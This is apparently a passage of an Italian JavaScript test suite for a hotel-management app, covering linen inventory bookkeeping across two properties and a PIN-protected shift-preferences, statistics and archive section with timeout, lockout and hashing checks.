    mov({ data: '03/09/2026', tipo: 'restituzione', persona: 'Rossi A.',  q: { Federa: 4 } })
  ], tipologie: null };

  var mag = _gcMagazzino('ar');
  ok('il conteggio fa da base',            mag.contato, true);
  ok('e dice di quando e\'',               mag.data, '01/09/2026');
  ok('federe: 100 -12 -8 +4',              mag.q.Federa, 84);
  ok('teli doccia: 40 -6',                 mag.q['Telo doccia'], 34);

  var car = _gcCarico('ar');
  ok('Rossi ha in mano 12-4 federe',       car['Rossi A.'].q.Federa, 8);
  ok('piu\' i 6 teli: 14 pezzi',           car['Rossi A.'].tot, 14);
  ok('Bianchi ne ha 8',                    car['Bianchi G.'].tot, 8);
  ok('in mano in tutto',                   _gcTot(_gcCaricoTot('ar')), 22);
  // La gcenza totale e' magazzino + quello che gira: nessun pezzo sparisce solo perche'
  // e' su un carrello.
  ok('gcenza totale = 140 di partenza',  _gcTot(mag.q) + _gcTot(_gcCaricoTot('ar')), 140);

  // `apertoDa` NON e' la data dell'ultimo prelievo: e' il giorno in cui il carico si e'
  // aperto e non e' piu' tornato a zero. E' l'unica cosa azionabile ("in sospeso da N
  // giorni"); l'ultimo prelievo direbbe il contrario proprio quando serve di piu'.
  ok('Rossi ha un carico aperto dal 02',   car['Rossi A.'].apertoDa, '02/09/2026');
  ok('ma l\'ultimo movimento e\' del 03',  car['Rossi A.'].ultimo,   '03/09/2026');

  // Un secondo conteggio riparte da zero sul magazzino ma NON tocca i carichi aperti.
  _gc.movimenti.push(mov({ data: '04/09/2026', tipo: 'conteggio', q: { Federa: 80, 'Telo doccia': 34 } }));
  var mag2 = _gcMagazzino('ar');
  ok('il nuovo conteggio diventa la base',  mag2.q.Federa, 80);
  ok('e i carichi restano dov\'erano',      _gcCarico('ar')['Rossi A.'].tot, 14);

  // Chi restituisce tutto chiude il carico: apertoDa torna vuoto, e non deve restare
  // acceso l'avviso "in sospeso da N giorni" su una che non ha piu' niente in mano.
  _gc.movimenti.push(mov({ data: '05/09/2026', tipo: 'restituzione', persona: 'Rossi A.', q: { Federa: 8, 'Telo doccia': 6 } }));
  var car3 = _gcCarico('ar');
  ok('Rossi ha riportato tutto',            car3['Rossi A.'].tot, 0);
  ok('e il carico non e\' piu\' aperto',    String(car3['Rossi A.'].apertoDa), 'null');
  ok('il magazzino se li riprende',         _gcMagazzino('ar').q.Federa, 88);

  // AGGIUNTA — pezzi nuovi che entrano in magazzino e non erano di nessuno (un acquisto,
  // una consegna del fornitore). Fa +1 sul magazzino come una restituzione, ma NON deve
  // chiudere il carico di nessuno: prima che esistesse, per registrare merce nuova si era
  // costretti a intestare una restituzione a qualcuno, e quel qualcuno si ritrovava un
  // carico negativo — cioe' un ammanco inventato.
  var _carPrima = _gcTot(_gcCaricoTot('ar'));
  _gc.movimenti.push(mov({ data: '06/09/2026', tipo: 'aggiunta', q: { Federa: 20, Scendibagno: 5 } }));
  ok('l\'aggiunta entra in magazzino',      _gcMagazzino('ar').q.Federa, 108);
  ok('anche su una voce mai contata',       _gcMagazzino('ar').q.Scendibagno, 5);
  ok('e non tocca nessun carico',           _gcTot(_gcCaricoTot('ar')), _carPrima);
  ok('non inventa una persona',             Object.keys(_gcCarico('ar')).indexOf('') , -1);

  // Il carico si decide su `carico`, NON sul segno: aggiunta e restituzione hanno lo
  // stesso +1. Se un domani il controllo tornasse sul segno, una persona finita per
  // sbaglio su un'aggiunta si vedrebbe accreditare pezzi che non ha mai preso.
  _gc.movimenti.push(mov({ data: '06/09/2026', tipo: 'aggiunta', persona: 'Bianchi G.', q: { Federa: 7 } }));
  ok('una persona su un\'aggiunta e ignorata', _gcCarico('ar')['Bianchi G.'].tot, 8);
  ok('ma il magazzino la conta lo stesso',      _gcMagazzino('ar').q.Federa, 115);

  ok('l\'aggiunta somma al magazzino',      (GC_TIPI.aggiunta || {}).segno, 1);
  ok('e non e\' un movimento di carico',    (GC_TIPI.aggiunta || {}).carico, false);
  ok('quindi non chiede un nome',           String((GC_TIPI.aggiunta || {}).persona), 'null');
  ok('la restituzione un nome lo chiede',   !!GC_TIPI.restituzione.persona, true);
  // L'ordine delle chiavi e' l'ordine dei pulsanti nella maschera: Aggiunta sta fra
  // Restituzione e Conteggio, come chiesto dal QM.
  ok('sta fra restituzione e conteggio',    Object.keys(GC_TIPI).join(','), 'prelievo,restituzione,aggiunta,conteggio');

  // Le strutture non si mescolano. Dal 07/09/2026 il magazzino e' uno solo (SoulArt) e
  // nessuno scrive piu' movimenti col Boutique, ma il filtro per struttura deve reggere
  // lo stesso: i movimenti gia' salvati con hotel:'sb' non vanno scartati ne' sommati al
  // SoulArt, e se un domani il Boutique aprisse un suo magazzino il filtro e' gia' quello.
  _gc.movimenti.push(mov({ data: '05/09/2026', tipo: 'prelievo', hotel: 'sb', persona: 'Verdi M.', q: { Federa: 30 } }));
  ok('Santa Brigida non tocca Art Resort',    _gcMagazzino('ar').q.Federa, 115);
  ok('e il carico e\' solo suo',            Object.keys(_gcCarico('sb')).join(','), 'Verdi M.');
  ok('Art Resort non vede Verdi',              _gcCarico('ar')['Verdi M.'] === undefined, true);

  // Senza nessun conteggio il magazzino NON va mostrato: sarebbe "restituito meno
  // prelevato", cioe' quasi sempre un negativo che sembra un guasto. La vista lo
  // dichiara "da contare", e per farlo deve poterlo sapere.
  _gc = { movimenti: [mov({ data: '01/09/2026', tipo: 'prelievo', persona: 'Rossi A.', q: { Federa: 5 } })], tipologie: null };
  ok('mai contato lo dice',                 _gcMagazzino('ar').contato, false);
  ok('ma il carico si conta lo stesso',     _gcCarico('ar')['Rossi A.'].tot, 5);

  // Una tipologia tolta dall'elenco non porta via i pezzi che ha ancora in giro: esce
  // dalla maschera, ma resta in fondo alla tabella. Altrimenti si perderebbero dei numeri
  // cambiando una riga di configurazione.
  _gc = { movimenti: [
    mov({ data: '01/09/2026', tipo: 'conteggio', q: { Federa: 10, Accappatoio: 7 } })
  ], tipologie: ['Federa'] };
  ok('l\'elenco corrente e\' una voce',     _gcVoci().length, 1);
  ok('ma la voce con pezzi resta visibile', _gcVociUsate('ar').join(','), 'Federa,Accappatoio');
  ok('e il totale la comprende',            _gcTot(_gcMagazzino('ar').q), 17);

  // Le due liste di partenza sono quelle dei fogli camera, non quelle dei resi: gcenza,
  // consumi e giro devono parlare degli stessi pezzi.
  ok('le voci di partenza sono GB_VOCI',    GC_VOCI_DEFAULT.join('|'), GB_VOCI.join('|'));
  // Nella Galleria i magazzini sono DUE, uno per struttura, con le linguette come il Reso.
  ok('due magazzini: Art Resort e Santa Brigida', Object.keys(GC_HOTELS).join(','), 'ar,sb');
  ok('e si chiamano come nel giro',         GC_HOTELS.sb, GB_HOTELS.sb);
  ok('la chiave e\' della Galleria (bg_)',  GC_KEY, 'bg_gcenza');
  ok('niente organico ne\' turno di Compass', /DEPTS|weekData/.test(String(_gcPersone)), false);
  ok('i nomi gia\' usati si propongono',     _gcPersone().join(','), '');
  // Un nome con l'apostrofo passa da due interpretazioni (HTML e poi JS) prima di
  // arrivare nell'onclick: senza neutralizzarlo, D'Angelo romperebbe il pulsante — e
  // nell'organico ci sono gia' dei D'.
  ok('l\'apostrofo non rompe l\'onclick',   _gcJs("D'Angelo"), "D\\'Angelo");
  ok('e nemmeno un < in una nota',          _gcEsc('<b>'), '&lt;b&gt;');

  // L'eliminazione deve segnare l'id fra i rimossi PRIMA del salvataggio, altrimenti la
  // fusione col cloud lo rimette dentro e il cestino non cancella niente (il difetto che
  // resiDelRow si era dimenticato).
  ok('gcEliminaMovimento segna il rimosso', /_grSegnaRimosso/.test(String(gcEliminaMovimento)), true);

  _gc = _g; _gcHotel = _h;
})();
// La pagina si disegna con le due linguette e la struttura scelta.
(function () {
  var box = { innerHTML: '' }, vero = document.getElementById, g = _gc, h = _gcHotel;
  _gc = { movimenti: [{ id: 'x1', ts: 1, hotel: 'sb', data: '10/11/2026', tipo: 'prelievo', persona: 'Neri P.', q: { Federa: 3 } }], tipologie: null };
  _gcHotel = 'sb';
  document.getElementById = function (id) { return id === 'gc-content' ? box : null; };
  try { gcRender(); } finally { document.getElementById = vero; }
  ok('Galleria Giacenza: due linguette',      (box.innerHTML.match(/gcSetHotel\('/g) || []).length, 2);
  ok('Galleria Giacenza: Santa Brigida vede il suo carico', /Neri P\./.test(box.innerHTML), true);
  _gcHotel = 'ar'; box.innerHTML = '';
  document.getElementById = function (id) { return id === 'gc-content' ? box : null; };
  try { gcRender(); } finally { document.getElementById = vero; _gc = g; _gcHotel = h; }
  // Il nome resta fra i suggerimenti (stesso personale), ma il carico e' di Santa Brigida.
  ok('Galleria Giacenza: Art Resort non ha il suo carico', /Nessun carico aperto/.test(box.innerHTML), true);
})();

// ── Bollino NEW sulle voci nuove: 5 giorni, poi sparisce (16/11/2026) ──
ok('NEW: visibile il giorno dell\'aggiunta', _gbNuovoVisibile('2026-11-21', new Date(2026, 10, 16)), true);
ok('NEW: ancora il quinto giorno',          _gbNuovoVisibile('2026-11-21', new Date(2026, 10, 20)), true);
ok('NEW: sparito il sesto',                 _gbNuovoVisibile('2026-11-21', new Date(2026, 10, 21)), false);
ok('NEW: data sbagliata = niente bollino',  _gbNuovoVisibile('', new Date(2026, 10, 16)), false);

// ── Preferenze Turnazione: copia del modulo di Compass, dietro PIN (16/11/2026) ──
sez('Preferenze Turnazione (Galleria): si apre solo col PIN, 5 minuti, niente copia nel browser');
(function () {
  var box = { innerHTML: '', insertAdjacentHTML: function (p, h) { this.innerHTML = h + this.innerHTML; } };
  var vero = document.getElementById;
  var st0 = _gtStato, tp0 = _gtTp, sc0 = _gtScade, d0 = _gtData, f0 = _gtFilter, g0 = _gtCalDay;
  document.getElementById = function (id) { return id === 'gt-pref-content' ? box : null; };
  var chiuso, primo, aperto, dopo;
  try {
    gtPrefChiudi(''); _gtStato = { ok: true, resident: true, qm: true };
    _gtData = [{ nome: 'Rossi Prova', reparto: 'Reception', preferenza: 'RIPOSO', giornoRichiesto: '01/01/2020', ts: '2020-01-01T10:00:00Z' }];
    gtPrefRender(); chiuso = box.innerHTML;
    _gtStato = { ok: true, resident: false, qm: true }; gtPrefRender(); primo = box.innerHTML;
    _gtTp = 'tp.1.x'; _gtScade = Date.now() + 60000; _gtUltimaAttivita = Date.now(); _gtFilter = 'tutti'; _gtCalDay = null;
    _gtData = [{ nome: 'Rossi Prova', reparto: 'Reception', preferenza: 'RIPOSO', giornoRichiesto: '01/01/2020', ts: new Date().toISOString() }];
    box.innerHTML = ''; gtPrefRender(); aperto = box.innerHTML;
    _gtScade = Date.now() - 1; box.innerHTML = ''; gtPrefRender(); dopo = box.innerHTML;
    gtPrefChiudi('');
  } finally { document.getElementById = vero; _gtStato = st0; _gtTp = tp0; _gtScade = sc0; _gtData = d0; _gtFilter = f0; _gtCalDay = g0; }
  ok('chiuso: chiede il PIN',                       /Riservato al Front Office Manager/.test(chiuso) && /id="gt-pin"/.test(chiuso), true);
  ok('chiuso: nessuna richiesta a vista',           /Rossi Prova/.test(chiuso), false);
  ok('primo accesso: il Resident sceglie il PIN',   /Scegli il PIN del Front Office Manager/.test(primo) && /id="gt-pin2"/.test(primo), true);
  ok('aperto: le richieste e il conto alla rovescia', /Rossi Prova/.test(aperto) && /id="gt-resta"/.test(aperto), true);
  ok('scaduto: torna il PIN',                       /Rossi Prova/.test(dopo) || !/id="gt-pin"/.test(dopo), false);
  ok('chiudere cancella le richieste',              (gtPrefChiudi(''), _gtData.length), 0);
  ok('resta aperto 5 minuti',                       GT_DURATA, 300000);
  // Dal 16/11/2026 (QM): cambiando voce il permesso resta fino ai 5 minuti, la pagina si svuota.
  ok('lasciando la voce la pagina si svuota',       /_bgSezione==='preferenze'&&s!=='preferenze'\)\{const c=document\.getElementById\('gt-pref-content'\);if\(c\)c\.innerHTML=''/.test(String(bgSezione)), true);
  ok('ma il permesso non si butta',                 /_bgSezione==='preferenze'&&s!=='preferenze'\)\{gtPrefChiudi/.test(String(bgSezione)), false);
  ok('rientrando entro 5 minuti niente PIN',        /^[^{]*\{\s*if\(_gtAperto\(\)\)\{gtPrefRender\(\);return;\}/.test(String(gtPrefEntra)), true);
  ok('scaduti i 5 minuti si chiede il PIN',         /gtPrefChiudi\(''\)/.test(String(gtPrefEntra)), true);
  ok('le richieste non restano nel browser',        /setItem/.test(String(gtPrefLoad) + String(gtPrefApri)), false);
  ok('l\'indirizzo del foglio non è nella Galleria', /script\.google\.com/.test(String(gtPrefLoad) + String(_gtChiedi)), false);
  // Worker: i PIN stanno in chiavi qm_, che il codice della Galleria non legge.
  ok('il codice Galleria non legge i PIN',          permessoGalleria('/kv/get', 'qm_pin_resident') || permessoGalleria('/kv/get', 'qm_pin_qm'), false);
  var w = String(_workerFetch.fetch);
  ok('Worker: /turni-pref vuole un codice valido',  /pathname === '\/turni-pref'[\s\S]{0,400}verificaPassBg/.test(w), true);
  ok('Worker: il PIN del QM solo da Compass',       /'imposta-qm'\)\s*\{\s*if \(!qm\)/.test(w), true);
  ok('Worker: il Resident sceglie il PIN una volta', /'imposta-resident'\)\s*\{\s*if \(res\)/.test(w), true);
  ok('Worker: 5 errori fermano per 15 minuti',      /n >= 5 \? \{ n: 0, fino: ora \+ 15 \* 60000 \}/.test(w), true);
  ok('Worker: le richieste solo col permesso',      /'dati'\)\s*\{\s*if \(!\(await verificaTp/.test(w), true);
  ok('Worker: PIN cifrato, mai in chiaro',          /PBKDF2/.test(String(hashPin)), true);
  ok('Worker e Compass alla stessa versione',       WORKER_VERSIONE, WORKER_VERSIONE_ATTESA);
})();
// Un 401 della voce non deve aprire «codice non più valido» (16/11/2026, Worker vecchio in linea).
ok('Preferenze: niente schermata del codice da questa voce', /_gbFetch|gbMostraAttivazione/.test(String(_gtChiedi)), false);
ok('Worker: PIN sbagliato è 403, non 401',          /restano: n >= 5 \? 0 : 5 - n \}, 403\)/.test(String(_workerFetch.fetch)), true);
// Nei testi visibili è «Front Office Manager», mai «Resident Manager» (QM, 16/11/2026).
ok('Galleria: si chiama Front Office Manager',     /Resident/.test(String(gtPrefRender) + String(_grStampa)), false);
function chiusoPin() { var b = { innerHTML: '' }, v = document.getElementById, s0 = _gtStato; document.getElementById = function (id) { return id === 'gt-pref-content' ? b : null; }; try { gtPrefChiudi(''); _gtStato = { ok: true, resident: false, qm: true }; gtPrefRender(); } finally { document.getElementById = v; _gtStato = s0; } return b.innerHTML; }
// La casella del PIN non è un campo password: il browser la riempiva da solo (16/11/2026).
ok('PIN: casella vuota, non type=password',         /id="gt-pin"[^>]*type="text"/.test(chiusoPin()) && !/type="password"/.test(chiusoPin()), true);

// ── Statistiche ricevimento e archivio turni: sottovoce dietro lo stesso PIN (19/11/2026) ──
sez('Galleria: Statistiche ricevimento e archivio turni, col PIN di Preferenze Turnazione');
ok('la sottovoce è nel menu',                       Object.keys(BG_SEZIONI).indexOf('statistiche') > Object.keys(BG_SEZIONI).indexOf('preferenze'), true);
ok('la copia non riscrive le funzioni di Compass',  typeof gtuStatistiche === 'function' && typeof turniStatistiche === 'function' && gtuStatistiche !== turniStatistiche, true);
ok('stesse regole: 13/21 EVENTO è P',               (gtuNormalizza('13/21 EVENTO') || {}).tipo, 'p');
ok('stesso ordine: Vatiero dopo Perez',             gtuOrdina(['Vatiero R.', 'Raucci A.', 'Perez L.']).join(), 'Perez L.,Vatiero R.,Raucci A.');
ok('l\'archivio non si legge dal browser',          /localStorage/.test(String(gtuStoricoLeggi)), false);
(function () {
  var box = { innerHTML: '' }, vero = document.getElementById, sez0 = _bgSezione, st0 = _gtStato, tp0 = _gtTp, sc0 = _gtScade, ar0 = _gtuArch;
  var w = {}, chiuso, aperto;
  document.getElementById = function (id) { if (id === 'gtu-content') return box; if (id === 'gtuStatsWrap' || id === 'gtuArchivioWrap') return w[id] || (w[id] = { innerHTML: '' }); return null; };
  try {
    _bgSezione = 'statistiche'; gtPrefChiudi(''); _gtStato = { ok: true, resident: true, qm: true };
    gtPrefRender(); chiuso = box.innerHTML;
    _gtTp = 'tp.1.x'; _gtScade = Date.now() + 60000; _gtUltimaAttivita = Date.now();
    _gtuArch = { '2026-11-16': { dal: '2026-11-16', al: '2026-11-22', ts: 1, giorni: [{ data: '2026-11-16', shifts: { 'Perez L.': 'AC', 'Ditta A': 'SOUL 9' } }] } };
    _gtuSettSel = '2026-11-16';
    gtPrefRender(); aperto = box.innerHTML + (w.gtuStatsWrap || {}).innerHTML + (w.gtuArchivioWrap || {}).innerHTML;
    gtPrefChiudi('');
  } finally { document.getElementById = vero; _bgSezione = sez0; _gtStato = st0; _gtTp = tp0; _gtScade = sc0; _gtuArch = ar0; }
  ok('chiusa: chiede il PIN',                         /id="gt-pin"/.test(chiuso) && /Statistiche ricevimento/.test(chiuso), true);
  ok('aperta: le statistiche (non l\'archivio)',      /Statistiche ricevimento/.test(aperto) && /Perez L\./.test(aperto) && !/Turni archiviati/.test(aperto), true);
  // L'archivio è la sua voce (menu B, 19/11/2026).
  var box2 = { innerHTML: '' }, w2 = {}, v2 = document.getElementById, s2 = _bgSezione, arc;
  document.getElementById = function (id) { if (id === 'gtu-arch-content') return box2; if (id === 'gtuArchivioWrap') return w2[id] || (w2[id] = { innerHTML: '' }); return null; };
  try { _bgSezione = 'archivio'; _gtTp = 'tp.1.x'; _gtScade = Date.now() + 60000; _gtUltimaAttivita = Date.now();
    _gtuArch = { '2026-11-16': { dal: '2026-11-16', al: '2026-11-22', ts: 1, giorni: [{ data: '2026-11-16', shifts: { 'Perez L.': 'AC', 'Ditta A': 'SOUL 9' } }] } };
    _gtuSettSel = '2026-11-16'; gtPrefRender(); arc = box2.innerHTML + (w2.gtuArchivioWrap || {}).innerHTML; gtPrefChiudi('');
  } finally { document.getElementById = v2; _bgSezione = s2; }
  ok('archivio: la sua pagina, coi turni',            /Turni archiviati/.test(arc) && !/Statistiche ricevimento<\/span>/.test(arc), true);
  ok('archivio: Ditta A si legge Anushka',            />Anushka</.test(arc), true);
  ok('chiudere butta via l\'archivio',                 (gtPrefChiudi(''), _gtuArch), null);
})();
ok('Worker: l\'archivio solo col permesso del PIN', /'storico'\)\s*\{\s*if \(!\(await verificaTp/.test(String(_workerFetch.fetch)), true);
ok('Galleria: colonne delle statistiche come in Compass',
   (String(gtuRenderStats).match(/th\('([^']+)'/g) || []).join(), (String(turniRenderStats).match(/th\('([^']+)'/g) || []).join());

// I 5 minuti contano dall'ultima attività sulla pagina (QM, 19/11/2026).
(function () {
  var tp0 = _gtTp, sc0 = _gtScade, ua0 = _gtUltimaAttivita, ch0 = _gtChiedi, chiesto = [];
  try {
    _gtChiedi = function (c) { chiesto.push(c.azione); return Promise.resolve({ ok: true, tp: 'tp.2.y', scade: Date.now() + 300000 }); };
    _gtTp = 'tp.1.x'; _gtScade = Date.now() + 240000;
    _gtUltimaAttivita = Date.now() - 4 * 60000;
    ok('PIN: dopo 4 minuti fermi è ancora aperto',  _gtAperto(), true);
    _gtUltimaAttivita = Date.now() - 5 * 60000 - 1000;
    ok('PIN: dopo 5 minuti fermi si chiude',         _gtAperto(), false);
    ok('PIN: un movimento dopo la chiusura non riapre', (_gtAttivita(), _gtAperto()), false);
    _gtUltimaAttivita = Date.now() - 60000; _gtScade = Date.now() + 120000;
    _gtAttivita();
    ok('PIN: un movimento fa ripartire i 5 minuti',  Date.now() - _gtUltimaAttivita < 1000, true);
    ok('PIN: e chiede il rinnovo prima che scada',   chiesto.join(), 'rinnova');
  } finally { _gtTp = tp0; _gtScade = sc0; _gtUltimaAttivita = ua0; _gtChiedi = ch0; _gtRinnovo = null; }
})();
ok('Worker: il rinnovo vuole un permesso valido',   /'rinnova'\)\s*\{\s*if \(!\(await verificaTp/.test(String(_workerFetch.fetch)), true);
// Presenze Cascione: modulo in costruzione, solo con la firma (19/11/2026).
(function () {
  var box = { innerHTML: '' }, vero = document.getElementById;
  document.getElementById = function (id) { return id === 'gb-presenze' ? box : null; };
  var tp0 = _gtTp, sc0 = _gtScade, ua0 = _gtUltimaAttivita, st0 = _gtStato, chiuso;
  try {
    gtPrefChiudi(''); _gtStato = { ok: true, resident: true, qm: true }; _gbRenderPresenze(); chiuso = box.innerHTML;
    _gtTp = 'tp.1.x'; _gtScade = Date.now() + 60000; _gtUltimaAttivita = Date.now(); _gbRenderPresenze();
  } finally { document.getElementById = vero; _gtTp = tp0; _gtScade = sc0; _gtUltimaAttivita = ua0; _gtStato = st0; }
  ok('Presenze Cascione: chiede il PIN',            /id="gt-pin"/.test(chiuso) && !/Modulo in costruzione/.test(chiuso), true);
  ok('Presenze Cascione: modulo in costruzione',   /Presenze Cascione/.test(box.innerHTML) && /Modulo in costruzione/.test(box.innerHTML), true);
  ok('senza altre spiegazioni',                    /Prossima|Art Resort Galleria Umberto/.test(box.innerHTML), false);
  ok('con la firma della Suite',                   /Nuovo modulo della Suite Compass QM, ideata e sviluppata da Pierpaolo Presta[\s\S]*Per esclusivo uso interno/.test(box.innerHTML), true);
})();

ok('Galleria: l\'archivio apre sull\'ultima settimana', /_gtuSettSel===undefined\)_gtuSettSel=chiavi\[0\]/.test(String(gtuRenderArchivio)), true);
(function () {
  var box = { innerHTML: '' }, vero = document.getElementById;
  document.getElementById = function (id) { return id === 'gb-conteggio' ? box : null; };
  try { _gbRenderConteggio(); } finally { document.getElementById = vero; }
  var b2 = _gbCantiere('Presenze Cascione', 'Modulo in costruzione', null);
  ok('in costruzione senza riga di attivazione: una linea sola', (b2.match(/class="gb-cantiere-r"/g) || []).length, 1);
  ok('con la riga di attivazione restano due linee',        (box.innerHTML.match(/class="gb-cantiere-r"/g) || []).length, 2);
})();
// Attesa dopo il PIN e niente bussola nel menu (19/11/2026).
ok('PIN: animazione d\'attesa mentre si verifica',   /_gtMostraAttesa\([^)]*Verifica del PIN…'\)/.test(String(gtPrefApri)) && /gt-attesa-ago/.test(_gtAttesa('x')), true);
